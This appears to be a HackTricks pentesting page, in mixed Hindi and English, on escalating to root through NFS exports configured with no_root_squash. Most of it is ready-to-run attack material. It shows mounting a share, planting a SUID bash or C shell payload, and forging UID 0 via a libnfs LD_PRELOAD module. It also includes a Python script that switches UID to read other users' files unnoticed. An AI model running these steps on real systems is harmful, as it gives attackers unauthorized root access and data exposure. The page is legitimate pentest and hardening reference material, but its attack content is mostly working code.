# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing की Basic Info

NFS AUTH_SYS/AUTH_UNIX के साथ, server प्रत्येक RPC request में दिए गए `uid` और `gid` के आधार पर file-permission checks करता है। Kerberos जैसे अन्य security flavors अलग credentials का उपयोग करते हैं, और server permissions check करने से पहले numeric credentials को map कर सकता है।<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: प्रत्येक UID और GID को anonymous account पर map करता है, जो Linux पर default रूप से `nobody` (65534) होता है। Non-root requests के लिए `no_all_squash` default है।<sup>[[4]](#references)</sup>
- **`root_squash`**: यह Linux पर default है और UID/GID 0 (root) वाली requests को anonymous account पर map करता है; अन्य UIDs और GIDs को squash नहीं किया जाता।<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing को disable करता है, इसलिए UID/GID 0 वाली requests को server पर root के रूप में evaluate किया जा सकता है।<sup>[[4]](#references)</sup>

यदि कोई allowed client **`/etc/exports`** में configured **`no_root_squash`** वाले writable export को mount कर सकता है, तो उसकी UID/GID 0 वाली requests वहां server के root user के रूप में write कर सकती हैं।<sup>[[4]](#references)</sup>

**NFS** के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash का उपयोग करने वाला Option 1:
- किसी allowed client पर writable export को root के रूप में mount करें, उसमें **`/bin/bash`** copy करें, उसका **SUID** bit set करें, और उसे ऐसे victim mount से execute करें जिसमें `nosuid` का उपयोग न किया गया हो।<sup>[[2]](#references)[[4]](#references)</sup>
- Uploaded file का ownership root के पास बनाए रखने के लिए server को **`no_root_squash`** का उपयोग करना आवश्यक है। यदि root squashed है, तो किसी अन्य account के लिए SUID binary तभी संभव है जब client उस account के numeric UID/GID के साथ उसे legitimately create या own कर सके।<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
विकल्प 2, compiled C code का उपयोग करके:
- किसी allowed client से directory को mount करें, SUID permissions का दुरुपयोग करने वाले compiled payload को उसमें copy करें, उसका **SUID** bit सेट करें, और उसे victim से execute करें (कुछ [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) देखें)।
- पहले जैसी restrictions લાગુ होंगी
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> ध्यान दें कि यदि आप **अपनी मशीन से victim machine तक tunnel बना सकते हैं, तो required ports को tunnel करके privilege escalation के लिए Remote version का उपयोग कर सकते हैं**।\
> निम्नलिखित trick तब उपयोगी है जब `/etc/exports` export को victim's IP तक सीमित करता है: remote client इसे mount नहीं कर सकता, लेकिन local technique पहले से allowed host पर mounted share के माध्यम से काम कर सकती है।<sup>[[2]](#references)</sup>\
> इस unprivileged libnfs method के लिए, **`/etc/exports`** में export को `insecure` flag का उपयोग करना चाहिए, ताकि process non-reserved source port का उपयोग कर सके; `secure` default है, हालांकि reserved port bind करने में सक्षम process को इस option की आवश्यकता नहीं होती।<sup>[[1]](#references)[[4]](#references)</sup>

### मूल जानकारी

NFSv3 AUTH_UNIX client प्रत्येक call में अपना effective UID, GID और groups शामिल करता है, और server permission checks के लिए इनका उपयोग करता है। यह local technique [libnfs](https://github.com/sahlberg/libnfs) के माध्यम से RPC credentials forge करके इस model का दुरुपयोग करती है; इसका preload module NFS context में UID/GID को override करने का समर्थन करता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Library को Compile करना

libnfs example को target kernel के लिए adjustments की आवश्यकता हो सकती है; यहां उपयोग किए गए walkthrough में विशेष रूप से preload module compile करने से पहले fallocate syscalls को comment out करने का उल्लेख है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit चलाना

यह उदाहरण एक छोटा C helper बनाता है जो shell लॉन्च करता है, फिर उसे share पर रखता है और NFS context में UID 0 के साथ `ld_nfs.so` का उपयोग करके उसे SUID-root बनाता है।<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit code compile करें:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Exploit को share पर रखें और UID को fake करके उसकी permissions modify करें**।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root privileges प्राप्त करने के लिए exploit execute करें**।<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: Stealthy File Access के लिए NFShell

root access प्राप्त करने के बाद, यह `nfsh.py` pattern command चलाने से पहले effective UID को target file की UID पर सेट करता है, जिससे ownership को recursively बदले बिना access प्राप्त किया जा सकता है।<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
इस तरह चलाएँ:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [कम ज्ञात NFS privesc की एक कहानी](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 प्रोटोकॉल विनिर्देशन](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
